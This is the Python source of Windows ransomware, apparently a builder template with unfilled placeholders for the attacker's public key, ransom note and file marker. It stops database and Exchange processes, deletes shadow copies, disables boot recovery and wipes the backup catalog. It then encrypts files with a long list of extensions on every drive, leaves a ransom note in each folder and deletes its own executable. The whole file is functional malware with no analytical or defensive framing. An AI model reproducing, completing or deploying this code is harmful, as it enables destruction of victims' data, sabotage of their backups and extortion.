import math
import time
import os,sys
import ctypes
import base64
import winreg
import threading
from Crypto.Cipher import Salsa20,AES
class x25519:
    def __init__(self):
        self.P = 2 ** 255 - 19
        self.A24 = 121665
    def cswap(self,swap, x_2, x_3):
        dummy = swap * ((x_2 - x_3) % self.P)
        x_2 = x_2 - dummy
        x_2 %= self.P
        x_3 = x_3 + dummy
        x_3 %= self.P
        return (x_2, x_3)
    #Based on https://tools.ietf.org/html/rfc7748
    def X25519(self,k, u):
        x_1 = u
        x_2 = 1
        z_2 = 0
        x_3 = u
        z_3 = 1
        swap = 0
        for t in reversed(range(255)):
            k_t = (k >> t) & 1
            swap ^= k_t
            x_2, x_3 = self.cswap(swap, x_2, x_3)
            z_2, z_3 = self.cswap(swap, z_2, z_3)
            swap = k_t
            A = x_2 + z_2
            A %= self.P
            AA = A * A
            AA %= self.P
            B = x_2 - z_2
            B %= self.P
            BB = B * B
            BB %= self.P
            E = AA - BB
            E %= self.P
            C = x_3 + z_3
            C %= self.P
            D = x_3 - z_3
            D %= self.P
            DA = D * A
            DA %= self.P
            CB = C * B
            CB %= self.P
            x_3 = ((DA + CB) % self.P)**2
            x_3 %= self.P
            z_3 = x_1 * (((DA - CB) % self.P)**2) % self.P
            z_3 %= self.P
            x_2 = AA * BB
            x_2 %= self.P
            z_2 = E * ((AA + (self.A24 * E) % self.P) % self.P)
            z_2 %= self.P
        x_2, x_3 = self.cswap(swap, x_2, x_3)
        z_2, z_3 = self.cswap(swap, z_2, z_3)
        return (x_2 * pow(z_2, self.P - 2, self.P)) % self.P
    def decodeScalar25519(self,k):
         k_list = [(b) for b in k]
         k_list[0] &= 248
         k_list[31] &= 127
         k_list[31] |= 64
         return self.decodeLittleEndian(k_list)
    def decodeLittleEndian(self,b):
        return sum([b[i] << 8*i for i in range( 32 )])
    def unpack2(self,s):
        if len(s) != 32:
            raise ValueError('Invalid Curve25519 scalar (len=%d)' % len(s))
        t = sum(s[i] << (8 * i) for i in range(31))
        t += ((s[31] & 0x7f) << 248)
        return t
    def pack(self,n):
        return b''.join([int.to_bytes((n >> (8 * i)) & 255,1,'little') for i in range(32)])
    def clamp(self,n):
        n &= ~7
        n &= ~(128 << 8 * 31)
        n |= 64 << 8 * 31
        return n
    #Return nself.P
    def multscalar(self,n, p):
        n = self.clamp(self.decodeScalar25519(n))
        p = self.unpack2(p)
        return self.pack(self.X25519(n, p))
    #Start at x=9. Find point n times x-point
    def base_point_mult(self,n):
        n = self.clamp(self.decodeScalar25519(n))
        return self.pack(self.X25519(n, 9))
class Curve25519:
    def genkeypair():
        private = os.urandom(32)
        public = x25519().base_point_mult(private)
        return (public,private)
    def exchange(mypub,private):
        return x25519().multscalar(private,mypub)
{{mypub}}
{{note}}
{{file_flag}}
{{endwith}}
{{note_file}}
def kill():
    os.popen('taskkill /f /im Microsoft.Exchange.*')
    os.popen('taskkill /f /im MSExchange*')
    os.popen('taskkill /f /im sqlserver.exe')
    os.popen('taskkill /f /im sqlwriter.exe')
    os.popen('taskkill /f /im mysqld.exe')
    os.popen('vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet')
extensions_list = [
    '.txt',
    '.php',
    '.pl',
    '.7z',
    '.rar',
    '.m4a',
    '.wma',
    '.avi',
    '.wmv',
    '.csv',
    '.d3dbsp',
    '.sc2save',
    '.sie',
    '.sum',
    '.ibank',
    '.t13',
    '.t12',
    '.qdf',
    '.gdb',
    '.tax',
    '.pkpass',
    '.bc6',
    '.bc7',
    '.bkp',
    '.qic',
    '.bkf',
    '.sidn',
    '.sidd',
    '.mddata',
    '.itl',
    '.itdb',
    '.icxs',
    '.hvpl',
    '.hplg',
    '.hkdb',
    '.mdbackup',
    '.syncdb',
    '.gho',
    '.cas',
    '.svg',
    '.map',
    '.wmo',
    '.itm',
    '.sb',
    '.fos',
    '.mcgame',
    '.vdf',
    '.ztmp',
    '.sis',
    '.sid',
    '.ncf',
    '.menu',
    '.layout',
    '.dmp',
    '.blob',
    '.esm',
    '.001',
    '.vtf',
    '.dazip',
    '.fpk',
    '.mlx',
    '.kf',
    '.iwd',
    '.vpk',
    '.tor',
    '.psk',
    '.rim',
    '.w3x',
    '.fsh',
    '.ntl',
    '.arch00',
    '.lvl',
    '.snx',
    '.cfr',
    '.ff',
    '.vpp_pc',
    '.lrf',
    '.m2',
    '.mcmeta',
    '.vfs0',
    '.mpqge',
    '.kdb',
    '.db0',
    '.mp3',
    '.upx',
    '.rofl',
    '.hkx',
    '.bar',
    '.upk',
    '.das',
    '.iwi',
    '.litemod',
    '.asset',
    '.forge',
    '.ltx',
    '.bsa',
    '.apk',
    '.re4',
    '.sav',
    '.lbf',
    '.slm',
    '.bik',
    '.epk',
    '.rgss3a',
    '.pak',
    '.big',
    '.unity3d',
    '.wotreplay',
    '.xxx',
    '.desc',
    '.py',
    '.m3u',
    '.flv',
    '.js',
    '.css',
    '.rb',
    '.png',
    '.jpeg',
    '.p7c',
    '.p7b',
    '.p12',
    '.pfx',
    '.pem',
    '.crt',
    '.cer',
    '.der',
    '.x3f',
    '.srw',
    '.pef',
    '.ptx',
    '.r3d',
    '.rw2',
    '.rwl',
    '.raw',
    '.raf',
    '.orf',
    '.nrw',
    '.mrwref',
    '.mef',
    '.erf',
    '.kdc',
    '.dcr',
    '.cr2',
    '.crw',
    '.bay',
    '.sr2',
    '.srf',
    '.arw',
    '.3fr',
    '.dng',
    '.jpeg',
    '.jpg',
    '.cdr',
    '.indd',
    '.ai',
    '.eps',
    '.pdf',
    '.pdd',
    '.psd',
    '.dbfv',
    '.mdf',
    '.wb2',
    '.rtf',
    '.wpd',
    '.dxg',
    '.xf',
    '.dwg',
    '.pst',
    '.accdb',
    '.mdb',
    '.pptm',
    '.pptx',
    '.ppt',
    '.xlk',
    '.xlsb',
    '.xlsm',
    '.xlsx',
    '.xls',
    '.wps',
    '.docm',
    '.docx',
    '.doc',
    '.odb',
    '.odc',
    '.odm',
    '.odp',
    '.ods',
    '.odt',
    '.sql',
    '.zip',
    '.tar',
    '.tar.gz',
    '.tgz',
    '.biz',
    '.ocx',
    '.html',
    '.htm',
    '.3gp',
    '.srt',
    '.cpp',
    '.mid',
    '.mkv',
    '.mov',
    '.asf',
    '.mpeg',
    '.vob',
    '.mpg',
    '.fla',
    '.swf',
    '.wav',
    '.qcow2',
    '.vdi',
    '.vmdk',
    '.vmx',
    '.gpg',
    '.aes',
    '.ARC',
    '.PAQ',
    '.tar.bz2',
    '.tbk',
    '.bak',
    '.djv',
    '.djvu',
    '.bmp',
    '.cgm',
    '.tif',
    '.tiff',
    '.NEF',
    '.cmd',
    '.class',
    '.jar',
    '.java',
    '.asp',
    '.brd',
    '.sch',
    '.dch',
    '.dip',
    '.vbs',
    '.asm',
    '.pas',
    '.ldf',
    '.ibd',
    '.MYI',
    '.MYD',
    '.frm',
    '.dbf',
    '.SQLITEDB',
    '.SQLITE3',
    '.asc',
    '.lay6',
    '.lay',
    '.ms11',
    '.sldm',
    '.sldx',
    '.ppsm',
    '.ppsx',
    '.ppam',
    '.docb',
    '.mml',
    '.sxm',
    '.otg',
    '.slk',
    '.xlw',
    '.xlt',
    '.xlm',
    '.xlc',
    '.dif',
    '.stc',
    '.sxc',
    '.ots',
    '.ods',
    '.hwp',
    '.dotm',
    '.dotx',
    '.docm',
    '.DOT',
    '.max',
    '.xml',
    '.uot',
    '.stw',
    '.sxw',
    '.ott',
    '.csr',
    '.key',
    'wallet.dat']
keypair = Curve25519.genkeypair()
publickey = keypair[0]
shared = Curve25519.exchange(mypub,keypair[1])
del keypair
def GetAllDrives():
    buf = ctypes.create_string_buffer(78)
    ctypes.windll.kernel32.GetLogicalDriveStringsW(ctypes.sizeof(buf),buf)
    dblist = buf.raw.replace(b'\x00',b'').split(b'\\')
    dlist = []
    for i in dblist:
        if os.path.isdir(i.decode()+'\\') and i != b'':
            dlist.append(i.decode()+'\\')
    return dlist
def encrypt(file):
    file_size = os.path.getsize(file)
    f = open(file,'rb')
    key = os.urandom(32)
    cipher = Salsa20.new(key=key,nonce=key[10:18])
    context = bytearray(f.read())
    if file_size > 0x1400000:
        chunks = math.ceil(file_size/0xA00000)
        for i in range(0,chunks*0xA00000,0xA00000):
            f.seek(i)
            chunk = f.read(0x100000)
            enchunk = cipher.encrypt(chunk)
            context[i:i+0x100000] = enchunk
        no = b''
    else:
        if file_size > 0x400000:
            no = bytes(context[0x400000:])
            context = context[:0x400000]
        else:
            no = b''
            context = context
        context = cipher.encrypt(bytes(context))
    f.close()
    cipher = AES.new(key=shared,mode=AES.MODE_ECB)
    enkey = cipher.encrypt(key)
    with open(file,'wb') as f:
        f.write(enkey+bytes(context)+no+file_flag)
    return True
def write_readme(path,ID):
    note_path = os.path.join(path,note_file)
    with open(note_path,'w') as f:
        f.write(note.replace('{{ID}}',ID))
def endir(path,ID):
    for parent, dirnames, filenames in os.walk(path):
        if ':\\Windows' in parent or ':\\$RECYCLE.BIN' in parent:
            continue
        for filename in filenames:
            try:
                write_readme(parent,ID)
            except:
                pass
            file_path = os.path.join(parent, filename)
            extensions = os.path.splitext(file_path)[1]
            if extensions in extensions_list and filename != note_file:
                try:
                    os.rename(file_path,file_path+endwith)
                    encrypt(file_path+endwith)
                except:
                    pass
    return True
if __name__ == '__main__':
    add = 0
    for i in publickey:
        add += i
    IDb = publickey+int.to_bytes(add%256,1,'little')
    ID = base64.b64encode(IDb).decode()
    drives = GetAllDrives()
    kill()
    threads = []
    for drive in drives:
        threads.append(threading.Thread(target=endir,args=(drive,ID)))
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    del shared
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')
    desktop = winreg.QueryValueEx(key, "Desktop")[0]
    write_readme(desktop,ID)
    os.popen(os.path.join(desktop,note_file))
    try:
        os.remove(sys.executable)
    except:
        pass
    sys.exit()
